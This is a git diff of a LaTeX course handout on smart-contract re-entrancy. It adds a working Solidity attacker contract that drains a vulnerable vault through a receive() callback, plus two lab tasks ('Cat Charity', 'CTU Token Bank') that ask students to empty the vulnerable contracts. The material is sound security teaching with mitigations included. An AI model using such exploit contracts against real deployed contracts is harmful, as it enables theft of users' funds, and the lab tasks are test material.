@@ -121,11 +121,11 @@ $ npm install
 
 \section{Re-Entrancy Attacks}
 
-A re-entrancy attack is a technique where an external call is used to re-enter the same function or another function in a way that disrupts the expected flow or state changes. Despite being well-known, this vulnerability remains prevalent. For more information, refer to this \href{https://github.com/pcaversaccio/reentrancy-attacks?tab=readme-ov-file}{Historical Collection of Reentrancy Attacks}. There are several types of re-entrancy attacks, including single-function re-entrancy, cross-function re-entrancy, cross-contract re-entrancy, cross-chain re-entrancy, and read-only re-entrancy. The basic prerequisite for a reentrancy attack is that the vulnerable contract makes an external call and allows the attacker to exploit the not-yet-updated state of the vulnerable contract during this call.
+A re-entrancy attack is a technique where an external call is used to re-enter the same function or another function in a way that disrupts the expected flow or state changes. Despite being well-known, this vulnerability remains prevalent. For more information, refer to this \href{https://github.com/pcaversaccio/reentrancy-attacks?tab=readme-ov-file}{Historical Collection of Re-entrancy Attacks}. There are several types of re-entrancy attacks, including single-function re-entrancy, cross-function re-entrancy, cross-contract re-entrancy, cross-chain re-entrancy, and read-only re-entrancy. The basic prerequisite for a re-entrancy attack is that the vulnerable contract makes an external call and allows the attacker to exploit the not-yet-updated state of the vulnerable contract during this call.
 
 \subsection{Single-Function Re-Entrancy}
 
-This is the simplest example of reentrancy that you might encounter. Study the code and try to understand how it works. Then replicate this attack in the \href{https://remix.ethereum.org/?#activate=solidity&url=https://github.com/radovluk/unbreakable-vault/contracts/reentrancy01.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.28+commit.7893614a.js}{prepared file in REMIX IDE}.
+This is the simplest example of re-entrancy that you might encounter. Study the code and try to understand how it works. Then replicate this attack in the \href{https://remix.ethereum.org/?#activate=solidity&url=https://github.com/radovluk/unbreakable-vault/contracts/reentrancy01.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.28+commit.7893614a.js}{prepared file in REMIX IDE}.
 
 \begin{figure}[H]
 \centering
@@ -151,7 +151,7 @@ This is the simplest example of reentrancy that you might encounter. Study the c
   \quad if (victim.balance $>$ initialDeposit) 
   \\ then call Victim.withdraw() \\
   $\downarrow$ ... \\
-  \textbf{Step 7:} Reentrancy Loop: drain funds \\
+  \textbf{Step 7:} Re-entrancy Loop: drain funds \\
   $\downarrow$ ... \\
   \textbf{Step 8:} In the last \texttt{withdraw()} call \\
   balances[attacker] is finally set 0 \\
@@ -206,80 +206,6 @@ This is the simplest example of reentrancy that you might encounter. Study the c
   }
 \end{lstlisting}
 
-% \subsection{Cross-Function Re-Entrancy}
-
-% \textbf{Cross-function re-entrancy} involves two (or more) functions \textit{within the same contract} that can be called in a sequence leading to undesired behavior. For example, \codeinline{function A} might update some state or do a partial operation, then call \codeinline{function B} that triggers an external call back into \codeinline{function A} (or some other function) before the first operation is completed in a consistent manner.
-
-% \begin{lstlisting}[language=Solidity, caption=Cross-Function Re-Entrancy Example]
-% pragma solidity ^0.8.0;
-
-% contract CrossFunctionVictim {
-%     mapping(address => uint256) public balances;
-
-%     // Suppose there's a "lock" mechanism updated in function A
-%     bool internal locked = false;
-
-%     function functionA() public {
-%         require(!locked, "Already locked");
-%         locked = true;
-
-%         // Some partial operations
-%         balances[msg.sender] += 1;
-
-%         // Call functionB which eventually leads to an external call
-%         functionB(); 
-
-%         // More operations that expect to run after functionB
-%         locked = false; 
-%     }
-
-%     function functionB() public {
-%         // External call that could trigger a fallback
-%         (bool success, ) = msg.sender.call{value: 0}("");
-%         require(success, "External call failed");
-%     }
-% }
-% \end{lstlisting}
-
-% If an attacker carefully crafts the external call in \codeinline{functionB}, they can re-enter \codeinline{functionA} (or other internal functions) before the state is finalized (e.g., \codeinline{locked = false} is reset). This can lead to double-counting or bypassing intended checks. Although less common, this pattern can arise in complex contracts with multiple states and external calls.
-
-% \subsection{Cross-Contract Re-Entrancy}
-
-% \textbf{Cross-contract re-entrancy} occurs when two or more contracts call each other in a cycle. For instance:
-
-% \begin{enumerate}
-%     \item Contract \codeinline{A} calls a function in contract \codeinline{B}.
-%     \item Contract \codeinline{B}'s function (or fallback) calls back into contract \codeinline{A}.
-% \end{enumerate}
-
-% If contract \codeinline{A} is not designed to handle re-entrancy safely (i.e., by updating state after sending Ether or not guarding repeated calls), attackers can exploit that circular calling path to create an inconsistent state.
-
-% \begin{lstlisting}[language=Solidity, caption=Cross-Contract Re-Entrancy Example]
-% pragma solidity ^0.8.0;
-
-% contract ContractA {
-%     bool public locked;
-
-%     function callB(address _b) external {
-%         // Some partial logic
-%         locked = true;
-%         B(_b).doSomething(); 
-%         // More logic here that depends on 'locked'
-%         locked = false;
-%     }
-% }
-
-% contract B {
-%     function doSomething() external {
-%         // Re-enter ContractA
-%         ContractA(msg.sender).callB(address(this));
-%         // If 'locked' isn't handled properly, this re-entry can cause issues.
-%     }
-% }
-% \end{lstlisting}
-
-% In such a scenario, contract \codeinline{A} may not expect \codeinline{callB} to be invoked again while it is still executing.
-
 \subsection{Re-Entrancy Mitigations}
 
 \subsubsection*{Checks-Effects-Interactions Pattern}
@@ -333,11 +259,73 @@ function withdraw() public noReentrant {
 \end{lstlisting}
 
 \noindent
-Note: the example above still remains vulnerable to cross-function reentrancy attacks.
+Note: the example above still remains vulnerable to cross-function re-entrancy attacks.
+
+\subsection{Cross-Function/Cross-Contract Re-Entrancy}
+
+\textbf{Cross-function/Cross-contract re-entrancy} involves two (or more) functions (contracts) that can be called in a sequence leading to undesired behavior. Even if we mitigate the single-function re-entrancy with a simple mutex, we can still be vulnerable to this type of re-entrancy in more complex scenarios.
+
+\begin{lstlisting}[language=Solidity, caption=Cross-Function Re-Entrancy Example]
+contract Victim {
+    mapping(address => uint) private balances;
+    bool locked;
+
+    modifier noReentrant() {
+        require(!locked, "ReentrancyGuardError");
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function withdraw() public noReentrant {
+        uint amount = balances[msg.sender];
+        (bool success, ) = msg.sender.call{value: amount}("");
+        require(success);
+        balances[msg.sender] = 0;
+    }
+
+    function transfer(address to) public {
+        balances[msg.sender] = 0;
+        balances[to] += balances[msg.sender];
+    }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+}
+
+contract Attacker {
+    Victim victim;
+    uint256 private initialDeposit;
+
+    constructor(address _vulnerable) {
+        victim = Victim(_vulnerable);
+    }
+
+    function attack() public payable {
+        initialDeposit = msg.value;
+        victim.deposit{value: msg.value}();
+        victim.withdraw();
+    }
+
+    receive() external payable {
+        if (address(victim).balance > initialDeposit) {
+            victim.withdraw();
+        }
+    }
+}
+\end{lstlisting}
+
+\noindent
+Play around with this code example in \href{https://remix.ethereum.org/?#activate=solidity&url=https://github.com/radovluk/unbreakable-vault/contracts/reentrancy02.sol&lang=en&optimize=false&runs=200&evmVersion=null&version=soljson-v0.8.28+commit.7893614a.js}{prepared file in REMIX IDE}.
+
+\subsection{Read-Only Re-Entrancy}
+
+Read-only re-entrancy is a particular case of cross-contract re-entrancy attacks. This vulnerability occurs when a smart contract's behavior depends on the state of another contract. While attackers usually target state-changing functions, view functions can also provide outdated state information during a cross-contract re-entrancy. This scenario can lead to the exploitation of third-party infrastructure.
 
 \section{Task}
 
-\subsection{Task 1: Cat Charity Hijinks}
+\subsection*{Task 1: Cat Charity Hijinks}
 
 The \emph{Cat Charity} was supposed to fund the most adorable meow-a-thon in history. Generous donors (like the deployer) have already chipped in a hefty 10 ETH. You (the player), on the other hand, starts with a modest 1 ETH and a gleam in their eye. After the owner unexpectedly cancels the campaign, refunds are open—\emph{wide open}, as it turns out. 
 
@@ -346,14 +334,39 @@ The \emph{Cat Charity} was supposed to fund the most adorable meow-a-thon in his
 \textbf{Your Mission:}
 \begin{itemize}
     \item Empty the charity's balance, snatching the full 10 ETH for yourself.
-    \item End up with more than your initial 1 ETH, turning your purr-less pockets into a chonky Ether stash.
+    \item End up with more than 10 ETH, turning your purr-less pockets into a chonky Ether stash.
 \end{itemize}
 
 \noindent
-Code your solution in the \texttt{test/CatCharity.js} file. Verify your solution by running the following command:
+Code your solution in the \texttt{test/CatCharity.js} file. Use only the player account. Verify your solution by running the following command:
 
 \begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{bash}
 $ npm run catcharity
 \end{minted}
+
+\noindent
+Files that are relevant for this challenge: \texttt{test/CatCharity.js}, \texttt{scripts/CatCharity.sol}
+
+\subsection*{Task 2: CTU Token Bank}
+
+The \emph{CTU Token Bank} is a decentralized vault where users can stash their Ether, withdraw it, buy CTU Tokens with it, and sell those tokens back for Ether. This bank works hand-in-hand with the ERC-20 CTUToken contract to handle token transactions and employs a ReentrancyGuard to fend off re-entrancy attacks on crucial functions. CTU Tokens are a hot commodity, sold at a fixed rate of 1 Token per 1 ETH. Initially, the bank holds 10 ETH from anonymous clients. You start with 5.1 ETH and no CTU Tokens, while the bank owns all the CTU Tokens. You can only buy CTU Tokens if you have deposited funds in the bank.
+
+\medskip
+\noindent
+\textbf{Your Mission:}
+\begin{itemize}
+    \item Drain the bank's balance to zero.
+    \item End up with more than 15 ETH.
+\end{itemize}
+
+\noindent
+Code your solution in the \texttt{test/CTUTokenBank.js} file. Use only the player account. Verify your solution by running the following command:
+
+\begin{minted}[bgcolor=gray!5, fontsize=\footnotesize]{bash}
+$ npm run tokenbank
+\end{minted}
+
+\noindent
+Files that are relevant for this challenge: \texttt{test/CTUTokenBank.js}, \texttt{contracts/CTUToken.sol}, \texttt{contracts/CTUTokenBank.sol}
 
 \end{document}
